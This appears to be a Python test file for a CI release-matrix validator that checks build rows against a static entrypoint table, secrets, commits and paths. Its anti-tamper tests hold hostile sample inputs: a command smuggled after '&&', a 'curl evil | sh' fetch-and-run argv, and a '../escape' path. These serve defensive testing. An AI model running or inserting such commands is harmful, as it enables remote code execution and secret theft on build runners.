"""The static entrypoint table, and the matrix derived from it.

A reusable workflow runs in a repository that is not this one, so every row it
builds has to be justified here rather than accepted from a caller. The tests
below are the anti-tamper tests: take a valid matrix, change one field, and
assert that the change is refused *for that reason* — because a matrix that is
rejected for a vague reason gets worked around, and a matrix that is accepted is
a build job running a command nobody reviewed.

The other half is the policy: what configuration may declare, and what a release
does about a target it cannot build.
"""

from __future__ import annotations

import json
import unittest

from continuum import config as config_module
from continuum.config import parse_config
from continuum.release.contract import ContractError
from continuum.release.entrypoints import (
    ANDROID,
    APPLE,
    ENTRYPOINTS,
    ENTRYPOINT_SCHEMA,
    EntrypointError,
    MatrixTarget,
    ReleaseEntrypoint,
    ReleaseMatrix,
    assert_secrets_available,
    entrypoint_report,
    fragment_path,
    get,
    parse_matrix,
    resolve_matrix,
    supported,
    validate_matrix,
)

SHA = "a" * 40
OTHER_SHA = "b" * 40
VERSION = "1.0.0"

APPLE_CONFIG = """
version: 1
release:
  targets:
    - id: macos-app
      adapter: apple
      platform: macos
      build_strategy: swiftpm
      distribution: direct
      architectures:
        - arm64
        - x86_64
      artifacts:
        - tar.gz
        - zip
      binaries:
        - name: ExampleAgent
          identifier: com.example.agent
          entitlements: Resources/com.example.agent.entitlements
      signing:
        mode: self-signed-stable
        identity: Example Co
        p12_secret: CONTINUUM_APPLE_P12
        password_secret: CONTINUUM_APPLE_P12_PASSWORD
"""

UNSIGNED_CONFIG = """
version: 1
release:
  targets:
    - id: macos-app
      adapter: apple
      platform: macos
      build_strategy: swiftpm
      distribution: direct
      architectures:
        - arm64
      artifacts:
        - tar.gz
      binaries:
        - name: ExampleAgent
          identifier: com.example.agent
      signing:
        mode: adhoc
"""


def config_with(body: str) -> config_module.ContinuumConfig:
    return parse_config(body, source="test")


def matrix_for(body: str = APPLE_CONFIG, **overrides) -> ReleaseMatrix:
    return resolve_matrix(config_with(body), version=VERSION, source_sha=SHA, **overrides)


class TableTests(unittest.TestCase):
    def test_names_what_it_can_build(self):
        self.assertEqual(supported(), ("android", "apple", "generic", "jvm"))

    def test_every_entrypoint_can_say_what_it_runs_and_where(self):
        for name, entrypoint in ENTRYPOINTS.items():
            self.assertTrue(entrypoint.argv, name)
            self.assertTrue(entrypoint.runner, name)
            self.assertTrue(entrypoint.title, name)

    def test_builds_apple_on_a_runner_with_a_keychain(self):
        self.assertEqual(get(APPLE).runner, "macos-14")
        self.assertTrue(get(APPLE).signing)

    def test_builds_jvm_android_on_a_runner_with_a_jdk(self):
        for name in (ANDROID, "jvm"):
            self.assertEqual(get(name).runner, "ubuntu-24.04", name)
            self.assertEqual(get(name).toolchain, "jdk-17", name)

    def test_reports_an_adapter_it_has_never_heard_of(self):
        with self.assertRaises(EntrypointError) as caught:
            get("plan9")
        self.assertIn("apple", str(caught.exception))

    def test_refuses_an_entrypoint_with_nothing_to_run(self):
        with self.assertRaises(EntrypointError) as caught:
            ReleaseEntrypoint(adapter="x", title="x", argv=())
        self.assertIn("no command", str(caught.exception))

    def test_says_which_platforms_the_policy_cannot_declare_yet(self):
        report = entrypoint_report()
        self.assertIn("apple", report)
        self.assertIn("release policy cannot declare it yet", report)

    def test_distinguishes_a_platform_it_cannot_build_from_one_it_cannot(self):
        self.assertTrue(ENTRYPOINTS[APPLE].config_supported)
        self.assertFalse(ENTRYPOINTS[ANDROID].config_supported)


class MatrixResolutionTests(unittest.TestCase):
    def test_builds_one_row_per_declared_target(self):
        matrix = matrix_for()
        self.assertEqual(matrix.target_ids, ("macos-app",))
        self.assertEqual(matrix.version, VERSION)
        self.assertEqual(matrix.source_sha, SHA)

    def test_carries_the_command_and_runner_from_the_table(self):
        row = matrix_for().target("macos-app")
        self.assertEqual(row.argv, get(APPLE).argv)
        self.assertEqual(row.runner, get(APPLE).runner)
        self.assertEqual(row.toolchain, "swift")

    def test_carries_only_the_secrets_the_policy_actually_names(self):
        row = matrix_for().target("macos-app")
        self.assertEqual(
            row.secrets, ("CONTINUUM_APPLE_P12", "CONTINUUM_APPLE_P12_PASSWORD")
        )
        self.assertEqual(matrix_for(UNSIGNED_CONFIG).target("macos-app").secrets, ())

    def test_never_hands_a_job_a_secret_its_build_will_not_read(self):
        # A policy that names a certificate this entrypoint does not read gets a
        # row with no secrets rather than a row carrying a secret the build will
        # never open.
        target = config_module.ReleaseTarget(
            id="macos-app",
            adapter=APPLE,
            platform=config_module.PLATFORM_MACOS,
            build_strategy=config_module.BUILD_STRATEGY_SWIFTPM,
            distribution=config_module.DISTRIBUTION_DIRECT,
            signing=config_module.ReleaseSigningSettings(
                mode=config_module.SIGNING_SELF_SIGNED_STABLE,
                identity="Example Co",
                p12_secret="SOME_OTHER_CERTIFICATE",
                password_secret="SOME_OTHER_PASSWORD",
            ),
        )
        matrix = resolve_matrix(
            config_module.ContinuumConfig(
                release=config_module.ReleaseSettings(targets=(target,))
            ),
            version=VERSION,
            source_sha=SHA,
        )
        self.assertEqual(matrix.target("macos-app").secrets, ())

    def test_derives_an_idempotency_key_from_the_release_it_is_for(self):
        self.assertEqual(
            matrix_for().key, f"release/{VERSION}/{SHA}/stable"
        )

    def test_names_where_each_target_writes_its_result(self):
        self.assertEqual(
            matrix_for().target("macos-app").fragment, "runs/macos-app.json"
        )

    def test_names_a_derived_root_the_same_way_for_every_target(self):
        matrix = matrix_for(root="out/release")
        self.assertEqual(matrix.target("macos-app").fragment, "out/release/macos-app.json")

    def test_refuses_a_release_with_no_targets(self):
        with self.assertRaises(EntrypointError) as caught:
            resolve_matrix(config_with("version: 1"), version=VERSION, source_sha=SHA)
        self.assertIn("nothing to release", str(caught.exception))

    def test_refuses_a_target_it_cannot_build_rather_than_publishing_the_rest(self):
        body = APPLE_CONFIG.replace("build_strategy: swiftpm", "build_strategy: xcode-archive")
        with self.assertRaises(EntrypointError) as caught:
            matrix_for(body)
        self.assertIn("macos-app", str(caught.exception))
        self.assertIn("fewer targets than the policy lists", str(caught.exception))

    def test_names_a_declared_target_when_a_partial_release_is_asked_for(self):
        body = APPLE_CONFIG.replace("build_strategy: swiftpm", "build_strategy: xcode-archive")
        matrix = matrix_for(body, include_declared=True)
        self.assertTrue(matrix.target("macos-app").declared)
        self.assertEqual(matrix.target("macos-app").secrets, ())

    def test_refuses_an_adapter_the_table_has_no_entrypoint_for(self):
        config = config_with(APPLE_CONFIG)
        sneaky = config_module.ReleaseTarget(
            id="macos-app",
            adapter="plan9",
            platform=config_module.PLATFORM_MACOS,
            build_strategy=config_module.BUILD_STRATEGY_SWIFTPM,
            distribution=config_module.DISTRIBUTION_DIRECT,
        )
        with self.assertRaises(EntrypointError) as caught:
            resolve_matrix(
                config_module.ContinuumConfig(
                    release=config_module.ReleaseSettings(targets=(sneaky,))
                ),
                version=VERSION,
                source_sha=SHA,
            )
        self.assertIn("no entrypoint", str(caught.exception))

    def test_refuses_an_adapter_the_policy_cannot_declare_yet(self):
        config = config_with(APPLE_CONFIG)
        android = config_module.ReleaseTarget(
            id="android-app",
            adapter=ANDROID,
            platform=config_module.PLATFORM_MACOS,
            build_strategy=config_module.BUILD_STRATEGY_SWIFTPM,
            distribution=config_module.DISTRIBUTION_DIRECT,
        )
        with self.assertRaises(EntrypointError) as caught:
            resolve_matrix(
                config_module.ContinuumConfig(
                    release=config_module.ReleaseSettings(targets=(android,))
                ),
                version=VERSION,
                source_sha=SHA,
            )
        self.assertIn("release policy does not yet validate", str(caught.exception))

    def test_refuses_an_abbreviated_commit(self):
        with self.assertRaises(ContractError) as caught:
            resolve_matrix(config_with(APPLE_CONFIG), version=VERSION, source_sha="abc1234")
        self.assertIn("full source SHA", str(caught.exception))

    def test_refuses_a_target_id_that_is_not_a_slug(self):
        with self.assertRaises(EntrypointError) as caught:
            MatrixTarget(
                target="MacOS App",
                adapter=APPLE,
                runner="macos-14",
                argv=("continuum",),
                source_sha=SHA,
                version=VERSION,
                fragment="runs/x.json",
            )
        self.assertIn("lowercase slug", str(caught.exception))

    def test_refuses_a_target_with_nothing_to_run(self):
        with self.assertRaises(EntrypointError) as caught:
            MatrixTarget(
                target="x",
                adapter=APPLE,
                runner="macos-14",
                argv=(),
                source_sha=SHA,
                version=VERSION,
                fragment="runs/x.json",
            )
        self.assertIn("no command to run", str(caught.exception))

    def test_refuses_a_target_with_nowhere_to_write_its_result(self):
        with self.assertRaises(EntrypointError) as caught:
            MatrixTarget(
                target="x",
                adapter=APPLE,
                runner="macos-14",
                argv=("continuum",),
                source_sha=SHA,
                version=VERSION,
                fragment="",
            )
        self.assertIn("no fragment path", str(caught.exception))

    def test_refuses_a_secret_name_that_is_not_a_secret_name(self):
        with self.assertRaises(EntrypointError) as caught:
            MatrixTarget(
                target="x",
                adapter=APPLE,
                runner="macos-14",
                argv=("continuum",),
                source_sha=SHA,
                version=VERSION,
                fragment="runs/x.json",
                secrets=("apple_p12",),
            )
        self.assertIn("not a secret name", str(caught.exception))

    def test_refuses_a_matrix_that_lists_a_target_twice(self):
        row = matrix_for().target("macos-app")
        with self.assertRaises(EntrypointError) as caught:
            ReleaseMatrix(
                version=VERSION, source_sha=SHA, targets=(row, row)
            )
        self.assertIn("twice", str(caught.exception))

    def test_refuses_a_matrix_whose_targets_disagree_about_the_release(self):
        row = matrix_for().target("macos-app")
        with self.assertRaises(EntrypointError) as caught:
            ReleaseMatrix(version="2.0.0", source_sha=SHA, targets=(row,))
        self.assertIn("same commit", str(caught.exception))

    def test_refuses_an_empty_matrix(self):
        with self.assertRaises(EntrypointError) as caught:
            ReleaseMatrix(version=VERSION, source_sha=SHA)
        self.assertIn("no targets", str(caught.exception))

    def test_reports_a_version_that_is_not_one(self):
        with self.assertRaises(EntrypointError):
            ReleaseMatrix(version="v 1.0.0", source_sha=SHA, targets=(matrix_for().target("macos-app"),))

    def test_summarizes_itself_for_a_job_log(self):
        self.assertIn("macos-app", matrix_for().summary())
        self.assertIn(SHA[:7], matrix_for().summary())


class RoundTripTests(unittest.TestCase):
    def test_survives_being_written_and_read_back(self):
        matrix = matrix_for()
        again = validate_matrix(
            parse_matrix(matrix.to_json()),
            config=config_with(APPLE_CONFIG),
            source_sha=SHA,
            version=VERSION,
        )
        self.assertEqual(again.describe(), matrix.describe())
        self.assertEqual(again.key, matrix.key)

    def test_writes_one_line_for_a_workflow_input(self):
        self.assertNotIn("\n", matrix_for().artifact())
        self.assertEqual(json.loads(matrix_for().artifact())["schema"], ENTRYPOINT_SCHEMA)

    def test_refuses_a_matrix_from_another_version_of_continuum(self):
        payload = json.loads(matrix_for().to_json())
        payload["schema"] = "continuum.release-matrix/v0"
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("schema", str(caught.exception))

    def test_refuses_a_matrix_built_for_another_version(self):
        payload = json.loads(matrix_for().to_json())
        payload["version"] = "2.0.0"
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("nobody approved", str(caught.exception))

    def test_refuses_a_matrix_built_from_another_commit(self):
        payload = json.loads(matrix_for().to_json())
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=OTHER_SHA, version=VERSION)
        self.assertIn("one mistake the whole transaction", str(caught.exception))

    def test_refuses_a_matrix_that_is_not_json(self):
        with self.assertRaises(EntrypointError) as caught:
            parse_matrix("not json")
        self.assertIn("not JSON", str(caught.exception))

    def test_refuses_a_matrix_that_is_not_an_object(self):
        with self.assertRaises(EntrypointError):
            parse_matrix('["a"]')

    def test_refuses_a_row_with_no_fields(self):
        payload = json.loads(matrix_for().to_json())
        payload["targets"] = [{"target": "macos-app"}]
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("missing", str(caught.exception))

    def test_refuses_a_row_whose_command_is_a_string(self):
        payload = json.loads(matrix_for().to_json())
        payload["targets"][0]["argv"] = "continuum release target && curl evil"
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("never a string a shell splits", str(caught.exception))

    def test_refuses_a_row_with_a_command_the_table_does_not_have(self):
        payload = json.loads(matrix_for().to_json())
        payload["targets"][0]["argv"] = ["bash", "-c", "curl evil | sh"]
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("part of the entrypoint", str(caught.exception))

    def test_refuses_a_row_for_a_target_the_policy_does_not_declare(self):
        payload = json.loads(matrix_for().to_json())
        payload["targets"][0]["target"] = "sneaky"
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("does not declare", str(caught.exception))

    def test_refuses_a_row_that_claims_another_adapter(self):
        payload = json.loads(matrix_for().to_json())
        payload["targets"][0]["adapter"] = "jvm"
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("not the", str(caught.exception))

    def test_refuses_a_row_moved_to_a_runner_without_its_toolchain(self):
        payload = json.loads(matrix_for().to_json())
        payload["targets"][0]["runner"] = "ubuntu-24.04"
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("toolchain", str(caught.exception))

    def test_refuses_a_row_claiming_to_build_what_the_policy_cannot_build(self):
        body = APPLE_CONFIG.replace("build_strategy: swiftpm", "build_strategy: xcode-archive")
        payload = json.loads(matrix_for(body, include_declared=True).to_json())
        payload["targets"][0]["declared"] = False
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(body), source_sha=SHA, version=VERSION)
        self.assertIn("marked built", str(caught.exception))

    def test_refuses_a_matrix_with_no_rows(self):
        payload = json.loads(matrix_for().to_json())
        payload["targets"] = []
        with self.assertRaises(EntrypointError) as caught:
            validate_matrix(payload, config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)
        self.assertIn("no targets", str(caught.exception))

    def test_accepts_a_declared_row_when_the_release_asked_for_one(self):
        body = APPLE_CONFIG.replace("build_strategy: swiftpm", "build_strategy: xcode-archive")
        matrix = matrix_for(body, include_declared=True)
        again = validate_matrix(
            parse_matrix(matrix.to_json()), config=config_with(body), source_sha=SHA, version=VERSION
        )
        self.assertTrue(again.target("macos-app").declared)

    def test_refuses_a_matrix_that_is_not_an_object(self):
        with self.assertRaises(EntrypointError):
            validate_matrix([], config=config_with(APPLE_CONFIG), source_sha=SHA, version=VERSION)


class SecretTests(unittest.TestCase):
    def test_names_the_secrets_a_release_needs(self):
        self.assertEqual(
            matrix_for().required_secrets,
            ("CONTINUUM_APPLE_P12", "CONTINUUM_APPLE_P12_PASSWORD"),
        )

    def test_needs_nothing_from_an_unsigned_release(self):
        self.assertEqual(matrix_for(UNSIGNED_CONFIG).required_secrets, ())

    def test_reports_a_missing_secret_before_any_runner_is_asked(self):
        with self.assertRaises(EntrypointError) as caught:
            assert_secrets_available(matrix_for(), ["CONTINUUM_APPLE_P12"])
        self.assertIn("CONTINUUM_APPLE_P12_PASSWORD", str(caught.exception))
        self.assertIn("not a secret", str(caught.exception))

    def test_accepts_a_release_whose_secrets_are_all_present(self):
        self.assertEqual(
            assert_secrets_available(
                matrix_for(),
                ["CONTINUUM_APPLE_P12", "CONTINUUM_APPLE_P12_PASSWORD"],
            ),
            ("CONTINUUM_APPLE_P12", "CONTINUUM_APPLE_P12_PASSWORD"),
        )


class FragmentTests(unittest.TestCase):
    def test_derives_a_fragment_path_from_names_nothing_can_change(self):
        self.assertEqual(fragment_path("runs", "macos-app"), "runs/macos-app.json")

    def test_refuses_a_fragment_path_it_cannot_derive(self):
        with self.assertRaises(EntrypointError) as caught:
            fragment_path("runs", "../escape")
        self.assertIn("disagree about where", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
